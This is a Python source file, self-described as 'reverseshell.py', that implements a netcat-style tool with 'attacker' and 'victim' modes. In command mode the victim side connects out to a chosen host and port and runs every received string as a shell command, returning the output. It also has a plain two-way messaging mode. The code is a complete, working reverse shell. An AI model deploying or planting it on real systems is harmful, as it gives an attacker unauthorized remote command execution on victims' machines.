import socket
import getopt
import sys
import subprocess
import os
from threading import Thread

PORT= 0
LISTEN = False
COMMAND = False
IP= "127.0.0.1"

def send_msg(c):
    while True:
        print("Message to send:")
        inp = input()
        c.send(inp.encode())


def recv_msg(c):
    while True:
        print("Message to send:")
        print("-"*50)
        resp=c.recv(4096).decode()
        # if(resp=='exit'):
        #     sys.exit(0)
        print(resp)
        print("-"*50)


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def mode():
    if COMMAND==True:
        commandmode()
    else:
        sendmessagemode()

def commandmode():
    if LISTEN == True:
        attackercommandmode()
    else:
        victimcommandmode()

def sendmessagemode():
    if LISTEN == True:
        attackersendmessagemode()
    else:
        victimsendmessagemode()

def attackercommandmode():
    global IP,PORT
    s.bind((IP,PORT))
    s.listen(10)
    print("[*] Waiting for connection...")
    client_socket,addr = s.accept()
    print("Connection has been established | {}:{}".format(IP,PORT))
    while True:
        a=os.getcwd()
        command = input(a+">")
        if(command=="exit"):
            sys.exit(0)
            print("[*] Connection Closed")
        client_socket.send(command.encode())
        response =client_socket.recv(1024).decode()
        print(response)
        print("="*100)
        

def victimcommandmode():
    global IP,PORT
    s.connect((IP,PORT))
    print("Connected to Server")
    while True:
        command=s.recv(1024).decode()
        if command[:2] == "cd":
            try:
                os.chdir(command[3:])
                s.send("Success Change Directory".encode())
            except :
                s.send("Invalid".encode())
            continue
        process= subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        out_bytes = process.stdout.read() + process.stderr.read()
        out_str = out_bytes.decode()
        message = str.encode(out_str + os.getcwd() +'>')
        s.send(message)

def attackersendmessagemode():
    global IP,PORT,s
    s.bind((IP,PORT))
    print("[*] Waiting for connection...")
    s.listen(1)
    cons = []
    while True:
        con,addr = s.accept()
        cons.append(con)
        print("[*] Connection has been established | {}:{}\n".format(IP,PORT))
        send_thread = Thread(target=send_msg , args=(con,))
        recv_thread = Thread(target=recv_msg, args=(con,))
        send_thread.start()
        recv_thread.start()

def victimsendmessagemode():
    global IP,PORT,s
    s.connect((IP,PORT))
    print("[*] Connection has been established\n")
    send_thread = Thread(target=send_msg , args=(s,))
    recv_thread = Thread(target=recv_msg, args=(s,))
    send_thread.start()
    recv_thread.start()
    

def main():
    global IP,PORT,LISTEN,COMMAND
    opts , argv = getopt.getopt(sys.argv[1:],"t:p:cl",["target=","port=","command=","listen="])

    for key,value in opts:
        if key in("-t","--target"):
            IP=value
        elif key in("-p","--port"):
            if(int(value)>9 ):
                if(int(value)<4097):
                    PORT=int(value)
                else:
                    sys.exit()
        elif key in ("-l","--listen"):
            LISTEN=True
        elif key in ("-c","--command"):
            COMMAND=True
    # print(IP)
    # print(PORT)
    # print(LISTEN)
    # print(COMMAND)
    if(PORT==0 ):
        if(IP==""):
            print("Usage:")
            print(" reverseshell.py -p [port] -l \n reverseshell.py -t [target_host] -p [port] \n reverseshell.py -p [port] -l -c\n reverseshell.py -t [target_host] -p [port] -c \n")
            print("Description:")
            print(" -t --target  - set the target \n -p --port    - set the port to be used (between 10 and 4096) \n -l --listen  - listen on [target]:[port] for incoming connections \n -c --command - initialize a command shell \n")
            print("Example:")
            print(" reverseshell.py -p 8000 -l \n reverseshell.py -t 127.0.0.1 -p 8000 \n reverseshell.py -p 8000 -l -c \n reverseshell.py -t 127.0.0.1 -p 8000 -c \n ")
    else:
        mode()
    

if __name__ == "__main__":
    main()